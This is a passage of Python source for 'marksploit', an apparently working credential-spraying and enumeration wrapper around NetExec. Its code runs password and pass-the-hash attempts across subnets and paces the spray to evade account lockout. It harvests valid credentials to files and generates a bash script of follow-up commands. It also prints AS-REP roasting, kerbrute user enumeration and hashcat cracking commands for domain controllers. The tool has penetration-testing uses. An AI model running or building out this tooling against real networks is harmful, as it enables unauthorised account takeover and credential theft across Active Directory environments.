        if preprobed_protos is not None:
            open_protos = preprobed_protos
        elif self.no_port_probe:
            open_protos = list(self.protocols)
        else:
            open_protos = probe_protocols(target, self.protocols)
        result.open_protocols   = open_protos
        result.closed_protocols = [p for p in self.protocols if p not in open_protos]

        if not open_protos:
            result.scanned = False; result.skipped_reason = "no open ports"
            return result

        shared_identity = {
            "real_ip": target,
            "hostname": "",
            "domain": "",
        }
        _ip = target; _host = ""
        tasks: list[tuple[str,bool]] = []
        for proto in open_protos:
            tasks.append((proto, False))
            if proto in LOCAL_AUTH_PROTOS and not self.kerberos:
                tasks.append((proto, True))

        if show_progress:
            with self._progress_lock:
                self._done = 0; self._total = len(tasks); self._redraw()

        start = time.time()
        host_skip = threading.Event()

        with ThreadPoolExecutor(max_workers=max(2, self.workers)) as pool:
            anon_future = None
            if "smb" in open_protos and not self.kerberos:
                anon_future = pool.submit(self._scan_anon_smb, target, _ip, _host,
                                          show_progress)

            future_to_task = {
                pool.submit(self._scan_protocol, proto, target, scope,
                            shared_identity, host_skip, show_progress): (proto, scope)
                for proto, scope in tasks
            }
            for fut in as_completed(future_to_task):
                if self._stop.is_set(): break
                proto, scope = future_to_task[fut]
                key = f"{proto}-{'local' if scope else 'domain'}"
                try:
                    lines, successes, tinfo = fut.result()
                except Exception as exc:
                    lines = [("[!]", f"Task error: {exc}")]
                    successes = []; tinfo = ""
                    if self.debug:
                        import traceback; traceback.print_exc()
                result.protocol_lines[key] = lines
                if tinfo and not result.target_info: result.target_info = tinfo
                for s in successes:
                    (result.guests if s.is_guest else result.successes).append(s)
                if show_progress:
                    with self._progress_lock:
                        self._done += 1; self._redraw()

            if anon_future is not None:
                try:
                    al, as_ = anon_future.result()
                except Exception as exc:
                    al = [f"[!] Anonymous SMB error: {exc}"]; as_ = False
                result.anon_smb_lines = al; result.anon_smb = as_

        with self.identity_lock:
            cached_ip = shared_identity["real_ip"]
            cached_host = shared_identity["hostname"]
            cached_domain = shared_identity["domain"]

        result.hostname = cached_host or extract_hostname(result.target_info)
        result.domain   = cached_domain or extract_domain(result.target_info)
        result.is_dc    = looks_like_dc(result.target_info)
        result.real_ip  = cached_ip or target

        if result.real_ip == target:
            for line in result.anon_smb_lines:
                ip = extract_ipv4(line)
                if ip: result.real_ip = ip; break

        # ── auto-enum shares on anon/guest hits ────────────────────────
        if self.auto_enum and (result.anon_smb or result.guests):
            result.share_lines = self._auto_enum_shares(
                result.real_ip, result.hostname)

        result.elapsed = time.time() - start
        if show_progress:
            self._clear_progress()
        return result

    # ── spray mode ─────────────────────────────────────────────────────
    def _run_spray(self) -> int:
        """Creds-first loop: one credential per round across all targets.
        Safe against lockout — max 1 attempt per account per observation window."""

        # Pre-probe all targets
        print_info("[*]", f"pre-probing {len(self.targets)} targets...")
        alive: list[tuple[str,list[str]]] = []
        if self.no_port_probe:
            alive = [(t, list(self.protocols)) for t in self.targets]
        else:
            with ThreadPoolExecutor(max_workers=self.workers) as pool:
                futs = {pool.submit(probe_protocols, t, self.protocols): t
                        for t in self.targets}
                for f in as_completed(futs):
                    t = futs[f]
                    try:
                        protos = f.result()
                        if protos: alive.append((t, protos))
                    except Exception: pass
        print_info("[*]", f"alive: {len(alive)}/{len(self.targets)} targets")
        if not alive:
            print_info("[!]", "no reachable targets"); return 0

        # Lockout warning
        if len(self.creds) > LOCKOUT_WARN_THRESHOLD:
            print_info("[!]", f"{YELLOW}{BOLD}LOCKOUT WARNING{RESET}  "
                              f"{len(self.creds)} rounds — verify AD lockout policy")
        if self.spray_delay == 0 and len(self.creds) > 1:
            print_info("[!]", "no --spray-delay set — "
                              "recommend 30s+ for AD environments to stay under threshold")
        print()

        orig_creds  = self.creds
        results_map: dict[str, TargetResult] = {}

        for round_idx, cred in enumerate(orig_creds):
            if self._stop.is_set(): break

            # Delay between rounds
            if round_idx > 0 and self.spray_delay > 0:
                preview = (cred.secret[:2] + "***") if cred.secret else "(kerberos)"
                for remaining in range(self.spray_delay, 0, -1):
                    if self._stop.is_set(): break
                    sys.stderr.write(
                        f"\r\033[K  [*] next round ({cred.user}:{preview}) "
                        f"in {remaining}s ...  ")
                    sys.stderr.flush()
                    time.sleep(1)
                sys.stderr.write("\r\033[K"); sys.stderr.flush()

            preview = (cred.secret[:2] + "***") if cred.secret else "(kerberos)"
            print_info("[*]", f"round {round_idx+1}/{len(orig_creds)}  —  "
                              f"{cred.user}:{preview}  against {len(alive)} targets")

            self.creds = [cred]
            with self._progress_lock:
                self._scan_done = round_idx
                self._scan_total = len(orig_creds)
                self._done  = 0
                self._total = len(alive)
                self._redraw()

            for target, open_protos in alive:
                if self._stop.is_set(): break
                r = self._scan_target(target, preprobed_protos=open_protos)
                if target not in results_map:
                    results_map[target] = r
                else:
                    ex = results_map[target]
                    ex.successes.extend(r.successes)
                    ex.guests.extend(r.guests)
                    ex.anon_smb = ex.anon_smb or r.anon_smb
                    if r.target_info and not ex.target_info:
                        ex.target_info  = r.target_info
                        ex.hostname     = r.hostname
                        ex.domain       = r.domain
                        ex.is_dc        = r.is_dc
                        ex.real_ip      = r.real_ip or ex.real_ip
                    for k, lines in r.protocol_lines.items():
                        ex.protocol_lines.setdefault(k, []).extend(lines)
                with self._progress_lock:
                    self._done += 1; self._redraw()

            self._clear_progress()

        self.creds = orig_creds

        # Print results
        results = list(results_map.values())
        for r in results:
            print_target_block(r, self.extra_hash, self.verbose)
            sys.stdout.flush()
            if self.creds_file and r.successes:
                try: append_creds(self.creds_file, r)
                except OSError as exc: print_info("[!]", f"creds file error: {exc}")

        self._clear_progress()
        if len(results) > 1: self._print_summary(results)
        if self.json_out:    self._write_json(results)
        if self.script_file: self._write_script(results)
        self._print_next_steps(results)
        return 130 if self._stop.is_set() else 0

    # ── normal mode ────────────────────────────────────────────────────
    def run(self) -> int:
        if self.spray:
            if not self.quiet: self._print_banner()
            return self._run_spray()

        if not self.quiet: self._print_banner()

        # Lockout warning for non-spray multi-cred runs
        if not self.quiet and len(self.creds) > LOCKOUT_WARN_THRESHOLD:
            print_info("[!]", f"{YELLOW}{BOLD}LOCKOUT WARNING{RESET}  "
                              f"{len(self.creds)} creds against each target — "
                              f"consider --spray with --spray-delay for AD")
            print()

        results: list[TargetResult] = []
        try:
            target_workers = min(self.target_workers, len(self.targets))
            if target_workers <= 1:
                for target in self.targets:
                    if self._stop.is_set(): break
                    try:
                        r = self._scan_target(target)
                        with self._progress_lock:
                            self._scan_done += 1
                            self._done = self._total = 0
                            self._clear_progress()
                        print_target_block(r, self.extra_hash, self.verbose)
                        sys.stdout.flush()
                        with self._progress_lock:
                            if self._scan_done < self._scan_total:
                                self._redraw()
                        if self.creds_file and r.successes:
                            try: append_creds(self.creds_file, r)
                            except OSError as exc:
                                print_info("[!]", f"could not write creds file: {exc}")
                        results.append(r)
                    except KeyboardInterrupt:
                        raise
                    except Exception as exc:
                        r = self._failed_result(target, exc)
                        results.append(r)
            else:
                with self._progress_lock:
                    self._done = self._total = 0
                    self._scan_done = 0
                    self._scan_total = len(self.targets)
                    self._current_proto = f"with {target_workers} target workers"
                    self._redraw()

                with ThreadPoolExecutor(max_workers=target_workers) as pool:
                    future_to_target = {
                        pool.submit(self._scan_target, target, None, False): target
                        for target in self.targets
                    }
                    for fut in as_completed(future_to_target):
                        if self._stop.is_set(): break
                        target = future_to_target[fut]
                        try:
                            r = fut.result()
                        except KeyboardInterrupt:
                            raise
                        except Exception as exc:
                            r = self._failed_result(target, exc)
                        with self._progress_lock:
                            self._scan_done += 1
                            self._clear_progress()
                        print_target_block(r, self.extra_hash, self.verbose)
                        sys.stdout.flush()
                        with self._progress_lock:
                            if self._scan_done < self._scan_total:
                                self._redraw()
                        if self.creds_file and r.successes:
                            try: append_creds(self.creds_file, r)
                            except OSError as exc:
                                print_info("[!]", f"could not write creds file: {exc}")
                        results.append(r)
        finally:
            self._clear_progress()
            if len(results) > 1 and not self._stop.is_set():
                self._print_summary(results)
                self._print_probe_warning(results)
            if self.json_out:    self._write_json(results)
            if self.script_file: self._write_script(results)
            if not self._stop.is_set():
                self._print_next_steps(results)
        return 130 if self._stop.is_set() else 0

    def _failed_result(self, target: str, exc: Exception) -> TargetResult:
        self._clear_progress()
        print_info("[!]", f"error on {target}: {exc.__class__.__name__}: {exc}")
        if self.debug:
            import traceback; traceback.print_exc()
        else:
            print_info("[!]", "re-run with --debug for traceback")
        failed = TargetResult(target=target)
        failed.scanned = False
        failed.skipped_reason = f"error: {exc.__class__.__name__}"
        return failed

    def _print_probe_warning(self, results: list[TargetResult]) -> None:
        if self.no_port_probe:
            return
        skipped = [r for r in results if not r.scanned and r.skipped_reason == "no open ports"]
        if not skipped:
            return
        print_info("[!]", f"port probe skipped {len(skipped)}/{len(results)} targets with no open checked ports")
        if len(skipped) == len(results):
            print_info("[!]", "no targets reached nxc; retry with --no-port-probe or raise --target-workers more slowly")
            print_info("[*]", "example: marksploit -t <target> -u <user> -p <pass> --no-port-probe --target-workers 3")
        print()

    # ── banner ─────────────────────────────────────────────────────────
    def _print_banner(self) -> None:
        pl = ("all" if len(self.protocols) == len(ALL_PROTOCOLS)
              else ",".join(self.protocols))
        cl = f"{len(self.passwords)}p / {len(self.hashes)}h"
        print()
        print_info("[*]", f"{CYAN}{BOLD}marksploit{RESET}  |  "
                          f"{len(self.targets)} targets  "
                          f"{len(self.users)} users  {cl}  {self.workers} workers")
        if not self.spray:
            print_info("[*]", f"target workers: {self.target_workers}")
        print_info("[*]", f"protocols: {pl}  timeout: {NETEXEC_TIMEOUT}s/attempt")
        if self.spray:
            delay_str = f"{self.spray_delay}s delay" if self.spray_delay else "no delay"
            print_info("[*]", f"mode: SPRAY  ({delay_str} between rounds)")
        if self.auto_enum:
            print_info("[*]", "auto-enum: shares will be listed on anon/guest hits")
        if self.timeout_skip:
            print_info("[*]", "timeout-skip: enabled — dead hosts skipped quickly")
        print_info("[*]", f"nxc log: {self.log_file}")
        if self.creds_file:   print_info("[*]", f"creds output:  {self.creds_file}")
        if self.save_file:    print_info("[*]", f"saving output: {self.save_file}")
        if self.script_file:  print_info("[*]", f"script output: {self.script_file}")
        if self.kerberos:     print_info("[*]", "auth: kerberos cache")
        print()

    # ── summary ────────────────────────────────────────────────────────
    def _print_summary(self, results: list[TargetResult]) -> None:
        self._clear_progress()
        n_win = sum(1 for r in results if r.successes or r.anon_smb)
        print()
        print_info("[*]", f"scan complete  —  {n_win}/{len(results)} targets with credentials")
        for r in results:
            if not r.scanned: continue
            ip     = r.real_ip or r.target
            host   = r.hostname or r.target
            ok     = r.successes or r.anon_smb
            marker = "[+]" if ok else "[-]"
            proto  = (r.open_protocols[0] if r.open_protocols else "smb").upper()
            port   = PROTOCOL_PORTS.get(r.open_protocols[0]
                                        if r.open_protocols else "smb", 445)
            dc_tag   = " [DC]" if r.is_dc else ""
            cred_tag = (f" — {len(r.successes)} cred(s)" if r.successes else
                        " — anon smb"  if r.anon_smb   else "")
            print_cme(proto, ip, port, host, marker,
                      host + dc_tag + cred_tag + f"  [{r.elapsed:.1f}s]")
        print()

    # ── JSON output ────────────────────────────────────────────────────
    def _write_json(self, results: list[TargetResult]) -> None:
        def ser(s: Success) -> dict:
            return {"protocol":s.protocol,"scope":s.scope,"domain":s.domain,
                    "user":s.user,"secret":s.secret,"auth_type":s.auth_type.value,
                    "is_admin":s.is_admin,"is_guest":s.is_guest,"raw_message":s.raw_message}
        payload = {
            "scan_time":  datetime.now().isoformat(timespec="seconds"),
            "log_file":   self.log_file, "creds_file": self.creds_file,
            "kerberos":   self.kerberos, "protocols":  self.protocols,
            "spray_mode": self.spray,
            "targets": [{
                "target":r.target,"real_ip":r.real_ip,"hostname":r.hostname,
                "domain":r.domain,"is_dc":r.is_dc,"scanned":r.scanned,
                "skipped_reason":r.skipped_reason or None,
                "elapsed_seconds":round(r.elapsed,2),
                "open_protocols":r.open_protocols,"closed_protocols":r.closed_protocols,
                "anon_smb":r.anon_smb,"share_lines":r.share_lines,
                "successes":[ser(s) for s in r.successes],
                "guests":[ser(s) for s in r.guests],
            } for r in results],
        }
        try:
            with open(self.json_out,"w") as f: json.dump(payload,f,indent=2)
            print_info("[*]", f"JSON results: {self.json_out}")
        except OSError as exc:
            print_info("[!]", f"could not write JSON: {exc}")

    # ── shell script output ────────────────────────────────────────────
    def _write_script(self, results: list[TargetResult]) -> None:
        """Write a ready-to-run bash script with all suggested commands."""
        lines = [
            "#!/bin/bash",
            f"# marksploit — generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "# Review carefully before running.",
            "# Remove the 'exit 0' at the bottom when ready.",
            "", "set -euo pipefail", "",
        ]
        for r in results:
            if not (r.successes or r.anon_smb or r.share_lines):
                continue
            ip   = r.real_ip or r.target
            host = r.hostname or ip
            dc   = "  [DC]" if r.is_dc else ""
            lines += [
                f"# {'─'*60}",
                f"# {host}  ({ip}){dc}",
                f"# {'─'*60}",
                "",
            ]
            if r.anon_smb:
                lines += [
                    "# ── anonymous SMB ─────────────────────────────",
                    f"smbclient -L //{ip} -N",
                    f"enum4linux-ng -A {ip}",
                    f"crackmapexec smb {ip} -u '' -p '' --shares",
                    "",
                ]
            for s in sorted(r.successes, key=lambda x: (ALL_PROTOCOLS.index(x.protocol)
                            if x.protocol in ALL_PROTOCOLS else 99, int(x.local_auth))):
                if s.is_guest:
                    continue   # guest-only — anon block covers it
                scope = "local" if s.local_auth else "domain"
                lines.append(f"# ── {s.protocol.upper()} / {scope} — {s.user} ──────────")
                try:
                    for label, cmd in build_suggestions(
                            s, ip=ip, hostname=r.hostname,
                            is_dc=r.is_dc, extra_hash=self.extra_hash):
                        lines += [f"# {label}", cmd, ""]
                except Exception:
                    pass
        lines += ["", "exit 0", ""]
        try:
            with open(self.script_file, "w") as f:
                f.write("\n".join(lines))
            os.chmod(self.script_file, 0o755)
            print_info("[*]", f"script written: {self.script_file}  (chmod +x applied)")
        except OSError as exc:
            print_info("[!]", f"could not write script: {exc}")

    # ── next steps ─────────────────────────────────────────────────────
    def _print_next_steps(self, results: list[TargetResult]) -> None:
        if self.quiet: return
        dcs: dict[str,list[tuple[str,str]]] = {}
        for r in results:
            if r.is_dc and r.real_ip:
                dcs.setdefault(r.domain or "<DOMAIN>", []).append(
                    (r.hostname or r.real_ip, r.real_ip))
        has_dcs   = bool(dcs)
        has_files = bool(self.save_file or self.creds_file or
                         self.json_out  or self.log_file or self.script_file)
        if not has_dcs and not has_files: return

        print_info("[*]", "next steps")

        if has_dcs:
            print_info("[*]", "domain controllers", indent=1)
            for domain, hosts in dcs.items():
                for hostname, ip in hosts:
                    suffix = f"  ({domain})" if domain != "<DOMAIN>" else ""
                    print_info("[*]", f"{hostname}  {ip}{suffix}", indent=2)
            print()
            print_info("[*]", "no-auth AD attacks", indent=1)
            for domain, hosts in dcs.items():
                dc_ip = hosts[0][1]
                dom   = domain if domain != "<DOMAIN>" else "<DOMAIN>"
                print_info("[*]", f"# enumerate users", indent=2)
                print_info("[*]",
                    f"kerbrute userenum --dc {dc_ip} -d {dom} "
                    f"/usr/share/seclists/Usernames/Names/names.txt", indent=2)
                print_info("[*]", "# AS-REP roast (no creds needed)", indent=2)
                print_info("[*]",
                    f"impacket-GetNPUsers {dom}/ -dc-ip {dc_ip} "
                    f"-request -no-pass -usersfile users.txt", indent=2)
            print()
            print_info("[*]", "cracking hashes", indent=1)
            print_info("[*]", "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt  # AS-REP", indent=2)
            print_info("[*]", "hashcat -m 13100 kerb.hash  /usr/share/wordlists/rockyou.txt  # Kerberoast", indent=2)
            print_info("[*]", "hashcat -m 1000  ntds.hash  /usr/share/wordlists/rockyou.txt  # NTLM", indent=2)

        if has_files:
            print()
            print_info("[*]", "output files", indent=1)
            if self.save_file:   print_info("[*]", f"formatted output  →  {self.save_file}",   indent=2)
            if self.creds_file:  print_info("[*]", f"valid creds (TSV) →  {self.creds_file}",  indent=2)
            if self.json_out:    print_info("[*]", f"json results      →  {self.json_out}",     indent=2)
            if self.script_file: print_info("[*]", f"shell script      →  {self.script_file}",  indent=2)
            if self.log_file:    print_info("[*]", f"nxc raw log       →  {self.log_file}",     indent=2)
        print()


# ─── CLI ───────────────────────────────────────────────────────────────
def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="marksploit",
        description=(
            f"{BOLD}marksploit{RESET} — credential spray & enumeration wrapper "
            f"around NetExec (nxc)\n"
            f"Surfaces hits with suggested follow-up commands. "
            f"Enumeration only — never exploits."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{BOLD}EXAMPLES{RESET}

  Basic spray against a single host:
    marksploit -t 192.168.1.10 -u admin -p 'Password123'

  CIDR range, multiple users and passwords:
    marksploit -t 192.168.1.0/24 -u users.txt -p passwords.txt

  Pass-the-Hash:
    marksploit -t 192.168.1.10 -u admin -H aad3b435...:31d6cfe0...

  Kerberos ticket cache:
    marksploit -t dc01.corp.local -u admin -k

  Specific protocols only:
    marksploit -t 192.168.1.10 -u admin -p pw --protocols smb,winrm,rdp

  {BOLD}Lockout-safe spray across subnet (recommended for AD){RESET}:
    marksploit -t 192.168.1.0/24 -u users.txt -p passwords.txt \\
               --spray --spray-delay 30

  Full output suite with auto share enumeration:
    marksploit -t targets.txt -u users.txt -p passwords.txt \\
               --spray --spray-delay 60 --auto-enum \\
               --creds-file creds.tsv --script cmds.sh -S output.txt

{BOLD}SPRAY vs NORMAL MODE{RESET}

  Normal:  for each target → test all creds   (fast, lockout risk on AD)
  Spray:   for each cred   → test all targets  (lockout-safe, recommended for AD)

  Use --spray-delay 30 to match a standard 30-minute observation window.
  A delay of 0 means no pause — only safe on non-AD or permissive lockout policy.
"""
    )

    tgt = p.add_argument_group("TARGET")
    tgt.add_argument("-t", "--target", required=True,
        metavar="TARGET",
        help="IP, hostname, CIDR, or file of targets (one per line).")

    cred = p.add_argument_group("CREDENTIALS")
    cred.add_argument("-u", "--user", required=True,
        metavar="USER",
        help="Username or file of usernames.")
    cred.add_argument("-p", "--password",
        metavar="PASS",
        help="Password or file of passwords.")
    cred.add_argument("-H", "--hash",
        metavar="HASH",
        help="NTLM hash (LM:NT or NT-only). File of hashes also accepted.")
    cred.add_argument("-k", "--kerberos", action="store_true",
        help="Use Kerberos ticket cache ($KRB5CCNAME). Cannot mix with -p/-H.")

    proto = p.add_argument_group("PROTOCOLS")
    proto.add_argument("--protocols", metavar="LIST",
        help=f"Comma-separated subset to test. "
             f"Default: all. Valid: {','.join(ALL_PROTOCOLS)}")
    proto.add_argument("--no-port-probe", action="store_true",
        help="Skip TCP port probe — test all selected protocols regardless.")
    proto.add_argument("--max-cidr-hosts", type=int, default=DEFAULT_MAX_CIDR_HOSTS,
        metavar="N",
        help=f"Max hosts to expand from a CIDR. Default: {DEFAULT_MAX_CIDR_HOSTS}.")
    proto.add_argument("--timeout-skip", action="store_true",
        help="If a host times out on one protocol, skip remaining protocols "
             "for that host immediately rather than waiting them out.")

    spray = p.add_argument_group("SPRAY MODE  (lockout-safe AD spraying)")
    spray.add_argument("--spray", action="store_true",
        help="Enable spray mode: iterate credentials-first across all targets. "
             "One attempt per account per round — safe against lockout policies.")
    spray.add_argument("--spray-delay", type=int, default=DEFAULT_SPRAY_DELAY,
        metavar="SECONDS",
        help=f"Seconds to wait between spray rounds. Default: {DEFAULT_SPRAY_DELAY}. "
             "Set 0 for no delay (only safe on non-AD or permissive policy).")

    out = p.add_argument_group("OUTPUT")
    out.add_argument("-o", "--output",
        metavar="FILE",
        help="Path for the nxc raw log. Default: YYYY-MM-DD_HH-MM-SS.txt")
    out.add_argument("--creds-file", metavar="FILE",
        help="Append confirmed valid credentials to a TSV file.")
    out.add_argument("--json-output", metavar="FILE",
        help="Write full structured results to a JSON file.")
    out.add_argument("-S", "--save", metavar="FILE",
        help="Save all formatted output to a plain-text file (ANSI stripped).")
    out.add_argument("--script", metavar="FILE",
        help="Write a ready-to-run bash script of all suggested commands. "
             "Script is chmod +x'd automatically.")

    misc = p.add_argument_group("MISC")
    misc.add_argument("--auto-enum", action="store_true",
        help="Auto-run share enumeration (nxc --shares) on any anon/guest hits "
             "and fold results into the output block.")
    misc.add_argument("-w", "--workers", type=int, default=DEFAULT_WORKERS,
        metavar="N",
        help=f"Parallel workers per target. Default: {DEFAULT_WORKERS}.")
    misc.add_argument("--target-workers", type=int, default=DEFAULT_TARGET_WORKERS,
        metavar="N",
        help=f"Parallel targets in normal mode. Default: {DEFAULT_TARGET_WORKERS}.")
    misc.add_argument("-q", "--quiet", action="store_true",
        help="Suppress banner and next-steps section.")
    misc.add_argument("-v", "--verbose", action="store_true",
        help="Show [-] failure lines for every attempt.")
    misc.add_argument("--no-color", action="store_true",
        help="Disable ANSI colour output.")
    misc.add_argument("--debug", action="store_true",
        help="Print full Python tracebacks on errors.")

    return p.parse_args()


def main() -> int:
    args = parse_args()
    configure_colors(args.no_color)

    if not shutil.which("nxc"):
        print(f"{RED}{BOLD}Error:{RESET} 'nxc' (NetExec) not found on PATH.\n"
              f"  Install: pip install netexec", file=sys.stderr)
        return 1

    if args.kerberos and (args.password or args.hash):
        print(f"{RED}{BOLD}Error:{RESET} -k cannot combine with -p or -H.",
              file=sys.stderr); return 1
    if not args.kerberos and not args.password and not args.hash:
        print(f"{RED}{BOLD}Error:{RESET} need one of -p, -H, or -k.",
              file=sys.stderr); return 1

    # Install Tee before anything prints
    tee: Tee|None = None
    if args.save:
        try:
            tee = Tee(args.save); sys.stdout = tee
        except OSError as exc:
            print(f"{RED}{BOLD}Error:{RESET} cannot open save file: {exc}",
                  file=sys.stderr); return 1

    try:
        raw_targets = read_value_or_file(args.target)
        targets     = expand_targets(raw_targets, args.max_cidr_hosts)
        if not targets:
            raise ValueError("No targets after expansion.")
        users     = read_value_or_file(args.user)
        passwords = read_value_or_file(args.password) if args.password else []
        hashes    = read_value_or_file(args.hash)     if args.hash     else []
        protocols = parse_protocol_list(args.protocols)
        if not protocols:
            raise ValueError("No protocols selected.")
        log_file   = args.output or datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
        extra_hash = hashes[0] if hashes else None

        runner = MarkSploit(
            targets=targets, users=users, passwords=passwords,
            hashes=hashes, kerberos=args.kerberos,
            protocols=protocols, log_file=log_file,
            creds_file=args.creds_file, json_out=args.json_output,
            save_file=args.save, script_file=args.script,
            workers=args.workers, target_workers=args.target_workers,
            quiet=args.quiet, verbose=args.verbose,
            debug=args.debug, no_port_probe=args.no_port_probe,
            extra_hash=extra_hash,
            spray=args.spray, spray_delay=args.spray_delay,
            auto_enum=args.auto_enum, timeout_skip=args.timeout_skip,
        )
    except ValueError as exc:
        print(f"{RED}{BOLD}Error:{RESET} {exc}", file=sys.stderr)
        if tee: tee.close()
        return 1

    interrupted = {"n": 0}
    def _sigint(_sig, _frame):
        interrupted["n"] += 1
        if interrupted["n"] == 1:
            sys.stderr.write("\r\033[K\n[!] Cancelling — Ctrl-C again to force.\n")
            sys.stderr.flush()
            runner.cancel()
        else:
            os._exit(130)
    signal.signal(signal.SIGINT, _sigint)

    try:
        return runner.run()
    except KeyboardInterrupt:
        runner.cancel(); return 130
    finally:
        if tee: tee.close()


if __name__ == "__main__":
    sys.exit(main())
